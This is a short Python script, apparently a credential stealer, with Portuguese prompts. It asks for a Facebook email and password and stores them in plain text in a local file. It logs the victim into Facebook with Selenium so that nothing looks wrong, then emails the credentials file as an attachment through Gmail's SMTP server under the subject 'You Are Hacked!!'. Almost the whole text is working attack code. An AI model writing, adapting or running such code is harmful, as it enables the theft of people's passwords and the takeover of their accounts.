from selenium import webdriver
from getpass import getpass
import pyautogui as gui

import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

usr = input('Entre com seu email, usuario ou id: ')
pwd = getpass('Entre com sua senha: ')

f = open("file.txt", "w")
f.write("Email:\n")
f.write(usr)

f.write("\n")

f.write("Senha:\n")
f.write( pwd)
f.close()

driver = webdriver.Chrome()
driver.get('https://www.facebook.com/')

username_box = driver.find_element_by_id('email')
username_box.send_keys(usr)

password_box = driver.find_element_by_id('pass')
password_box.send_keys(pwd)

gui.press("enter")

login_btn = driver.find_element_by_id('u_0_d')
login_btn.submit()

##<---------------------- Enviar E-MAIL ---------------------->##

send = ""
#send = input("Enviar para: ")
#assunto = ("Assunto: ")
subject = "You Are Hacked!!" #Assunto
body = "(usr, pwd)" #Corpo do e-mail
sender_email = "" # Quem envia
receiver_email = send #Quem recebe
password = ""

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails

# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "file.txt"  # In same directory as script

# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)

